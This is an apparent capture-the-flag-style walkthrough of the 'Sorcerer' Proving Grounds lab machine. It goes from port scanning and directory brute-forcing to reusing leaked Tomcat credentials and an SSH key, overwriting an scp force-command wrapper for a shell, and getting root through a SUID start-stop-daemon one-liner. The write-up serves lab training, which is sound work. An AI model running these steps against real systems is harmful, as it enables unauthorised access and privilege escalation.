---
description: Pg Practice Sorcerer writeup
---

# Sorcerer

## Nmap

```
sudo nmap 192.168.150.100 -p- -sS -sV                                                                                                                                                                                              1 ⨯

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     nginx
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  3 (RPC #100227)
7742/tcp  open  http     nginx
8080/tcp  open  http     Apache Tomcat 7.0.4
43329/tcp open  nlockmgr 1-4 (RPC #100021)
45519/tcp open  mountd   1-3 (RPC #100005)
54375/tcp open  mountd   1-3 (RPC #100005)
55683/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

We have HTTP running on ports 80,8080 and 7742. I set to work running `feroxbuster` against all three ports before manually browsing to them.

```
./feroxbuster -u http://192.168.150.100:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![](<../../../.gitbook/assets/image (736).png>)

Port 80 shows a page with only '404 not found' displayed. Port 8080 takes us to Apache Tomcat/7.04.

![](<../../../.gitbook/assets/image (737).png>)

The link for the Manager App did not ask for authentication credentials like it normally does. It does provide us with a Access Denied page and also display the Tomcat default credentials of `tomcat:s3cret`.

![](<../../../.gitbook/assets/image (738) (1).png>)

We can store these later and possibly run these credentials against `nikto` or `gobuster` to see if we can enumerate further directories if required.

Port 7742 takes us to the following logon page which contains no identifying information apart from the name 'SORCERER' in the browser tab.

![](<../../../.gitbook/assets/image (739).png>)

Soon after `feroxbuster` picks up the /zipfiles/ directory. On browsing to this we find the following files.

![http://192.168.150.100:7742/zipfiles/](<../../../.gitbook/assets/image (740).png>)

I downloaded the zip files which are not encrypted and browsed through each with the GUI. The max.zip folder contained the most interesting information.

![](<../../../.gitbook/assets/image (741).png>)

The Tomcat files contains credentials for Tomcat.

```
  <role rolename="manager-gui"/>
  <user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
</tomcat-users>
```

We also have `SSH` keys for Max.

![](<../../../.gitbook/assets/image (742) (1).png>)

I changed the permissions of the id\_rsa file to 600 so we can use it for SSH.

```
chmod 600 id_rsa 
```

Looking at the authorized keys files we can see that the file scp\_wrapper.sh is being used as a force command when a user connecting to `SSH`.

![](<../../../.gitbook/assets/image (799).png>)

The contents of scp\_wrapper.sh

![](<../../../.gitbook/assets/image (800).png>)

This means when connect as the user max to SSH we can only execute commands that start with 'scp'. As `SCP` runs over `SSH` we can use use id\_rsa file from Max to connect and overwrite the wrapper file with something more useful such as 'bash' instead of 'scp'.

I edited the scp\_wrapper.sh file to include the command 'bash' and changed the error message for troubleshooting purposes.

![](<../../../.gitbook/assets/image (801).png>)

I then moved Max's 'id\_rsa' key into my SSH folder on /home/kali/.ssh/ in preperation for connecting to SCP.

Once completed connect by SCP and transfer over the wrapper file on our desktop.

```
scp /home/kali/Desktop/scp_wrapper.sh max@192.168.196.100:/home/max/scp_wrapper.sh
```

We can then SSH in as max and will have a bash shell.

```
ssh max@192.168.196.100  
```

![](<../../../.gitbook/assets/image (802).png>)

Upgrade the shell:

```
/usr/bin/script -qc /bin/bash /dev/null
```

Straight away I uploaded `linpeas.sh` after starting a `Python SimpleHTTPServer` on my attacking machine and executed once downloaded.

`Linpeas` soon picks up the SUID bit being set on /usr/sbin/start-stop-daemon.

![](<../../../.gitbook/assets/image (803).png>)

A search on[ GTFObins](https://gtfobins.github.io/gtfobins/start-stop-daemon/) shows we can spawn a root shell.

![](<../../../.gitbook/assets/image (804).png>)

Exploit syntax:

```
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

![](<../../../.gitbook/assets/image (805).png>)
